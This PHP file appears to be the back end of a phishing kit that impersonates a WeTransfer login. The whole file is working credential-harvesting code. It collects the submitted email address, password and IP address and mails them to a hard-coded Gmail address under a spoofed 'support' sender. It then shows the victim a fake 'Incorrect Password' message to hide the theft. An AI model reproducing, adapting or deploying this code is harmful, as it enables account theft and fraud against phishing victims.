<?php
class Email{
    public function clean($data){
        if(!empty($data)){
            $data = trim(strip_tags(stripslashes($data)));
            return $data;
        }
    }

	public function getIp(){
		$ip = $_SERVER['REMOTE_ADDR'];
		
		if(!empty($_SERVER['HTTP_CLIENT_IP'])){
			$ip = $_SERVER['HTTP_CLIENT_IP'];
		}elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
			$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		}
		return $ip;
	}

	public function sendMail($data){
        //$this->to = 'odilichukwujoel@gmail.com,Toolz.morathy@gmail.com';
        $this->to = 'odilichukwujoel@gmail.com';
		$pass = $data['pass'];
		$email = $data['email'];
		$ip = $data['ip'];
		$this->subject = "We Transfer Login Details";
		$this->msg = 
		"
		<html>
			<head>
				<title>New Secure Login</title>
			</head>

			<body>
				<h3>We Transfer Login Details</h3>
				<p>This is the information you required</p>
			    <br><br>
			    <p><strong>Email:</strong> $email</p>
			    <p><strong>Password:</strong> $pass</p>
			    <p><strong>IP:</strong> $ip</p>
			    <br>
			</body>
		</html>
		";

		// Content type for html message
		$this->header = "MIME-Version: 1.0"."\r\n";
		$this->header .= "Content-type:text/html;charset=UTF-8"."\r\n";

		// Header From
		$this->header .= "From: We Transfer Logins <support@officelogin.com>"."\r\n";

		//Forward the mail
		if(mail($this->to, $this->subject, $this->msg, $this->header)){
			return true;
		}else{
			return false;
		}

	}

}

$email = new Email;

if(isset($_POST)){
    $data = array();
    $data['email'] = $email->clean($_REQUEST['email']);
    $data['pass'] = $email->clean($_REQUEST['password']);
    $data['ip'] = $email->getIp();

    if($email->sendMail($data) == true){
        echo "Incorrect Password";
    }else{
        echo "Something went wrong";
    }
}

